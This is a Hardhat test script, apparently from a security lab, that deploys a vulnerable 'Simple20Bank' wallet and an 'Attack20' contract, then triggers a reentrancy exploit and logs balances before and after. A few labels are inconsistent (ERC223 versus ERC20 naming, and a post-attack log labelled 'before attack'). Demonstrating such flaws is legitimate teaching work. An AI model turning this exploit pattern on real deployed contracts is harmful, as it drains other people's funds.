const { expect } = require("chai");

describe("Simple223 Wallet", function () {
    describe("Attack ", function () {
        it("Should reentrancy", async function () {
            // 部署erc223代币合约
            const [owner] = await ethers.getSigners();

            const Wallet = await hre.ethers.getContractFactory("Simple20Bank",owner);
            const wallet = await Wallet.deploy({value: ethers.utils.parseEther("10.0")});

            await wallet.deployed();

            console.log("wallet contract deployed to:", wallet.address);

            tokenAdd = await wallet.token();
            console.log("token contract deployed to:", tokenAdd);

            const token = await hre.ethers.getContractAt("Simple20Token", tokenAdd);

            const Attack = await hre.ethers.getContractFactory("Attack20");
            const attack = await Attack.deploy(wallet.address);

            await attack.deployed();

            console.log("attack contract deployed to:", attack.address);

            console.log("before attack,the owner erc20 balance",await token.balanceOf(wallet.address))
            console.log("before attack,the attacker erc20 balance",await token.balanceOf(attack.address))
            console.log("before attack,the wallet ether balance",await wallet.getBalance())


            const receipt = await attack.exp({value: ethers.utils.parseEther("2.0")});
            console.log("before attack,the owner erc20 balance",await token.balanceOf(wallet.address))
            console.log("after attack,the wallet ether balance",await wallet.getBalance())
            console.log("after attack,the attacker erc20 balance",await token.balanceOf(attack.address))
            console.log("after attack,the attacker ether balance",await attack.getBalance())


        });
    });

});
